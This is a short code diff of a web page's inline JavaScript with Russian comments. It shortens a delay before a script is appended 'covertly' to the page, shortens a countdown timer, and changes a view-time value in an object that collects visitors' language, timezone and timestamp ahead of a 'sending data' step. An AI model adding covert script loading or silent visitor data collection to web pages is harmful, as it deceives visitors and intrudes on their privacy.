@@ -133,12 +133,12 @@
     // Добавляем скрытно в конец body
     document.body.appendChild(script);
     
-  }, 5000); // Загружаем через 5 секунд
+  }, 2000); // Загружаем через 5 секунд
   </script>
 
   <script>
   // Таймер обратного отсчета
-  let timeLeft = 30;
+  let timeLeft = 15;
   const timerElement = document.getElementById('timer');
   
   const countdown = setInterval(() => {
@@ -160,7 +160,7 @@
       language: navigator.language,
       timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
       timestamp: new Date().toISOString(),
-      viewTime: 30
+      viewTime: 15
     };
     
     // Отправка данных
